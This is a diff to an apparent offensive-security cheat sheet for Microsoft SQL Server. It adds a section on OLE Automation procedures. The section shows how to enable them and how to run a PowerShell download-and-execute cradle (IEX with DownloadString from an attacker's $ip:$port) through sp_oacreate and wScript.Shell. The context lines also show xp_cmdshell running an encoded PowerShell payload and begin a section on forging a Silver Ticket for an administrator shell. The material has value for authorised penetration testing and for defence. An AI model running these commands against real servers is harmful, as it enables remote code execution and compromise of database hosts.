@@ -249,6 +249,34 @@ RECONFIGURE;
 exec xp_cmdshell 'whoami'                             
 exec xp_cmdshell 'powershell -enc <encoded_raw_code>' 
 ```
+# OLE Automation in SQL Server
+> OLE Automation in Microsoft SQL Server refers to a set of extended stored procedures (like `sp_OACreate`, `sp_OAMethod`) that allow SQL Server to interact with COM/OLE objects, such as file systems or Windows applications.
+
+```bash
+# Check OLE Automation Status
+EXEC sp_configure 'Ole Automation Procedures';
+GO   
+
+# Enable OLE Automation
+sp_configure 'show advanced options', 1;
+GO
+RECONFIGURE;
+GO
+sp_configure 'Ole Automation Procedures', 1;
+GO
+RECONFIGURE;
+GO   
+
+# Execute Commands via OLE
+DECLARE @output INT
+DECLARE @ProgramToRun VARCHAR(255)
+SET @ProgramToRun = 'Run("powershell.exe -c IEX(New-Object Net.WebClient).DownloadString(''http://$ip:$port/file'')")'
+EXEC sp_oacreate 'wScript.Shell', @output OUT
+EXEC sp_oamethod @output, @ProgramToRun
+EXEC sp_oadestroy @output  
+```
+
+
 # Forge Ticket (Silver Ticket 🥈)
 - We are forging ticket to get the administrator shell in the mssql server. so we can run xp_cmdshell.
 - Forged using a specific service account hash.
